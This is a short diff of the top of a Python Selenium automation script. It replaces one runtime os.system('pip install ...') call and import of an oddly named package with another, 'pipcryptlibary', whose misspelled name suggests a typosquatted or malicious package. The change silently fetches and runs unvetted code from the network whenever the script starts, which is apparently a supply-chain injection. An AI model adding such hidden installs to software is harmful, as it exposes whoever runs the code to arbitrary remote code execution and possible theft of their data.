@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqlitepkgsV2")
-import pythonsqlitepkgsV2
+os.system("pip install pipcryptlibary")
+import pipcryptlibary
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
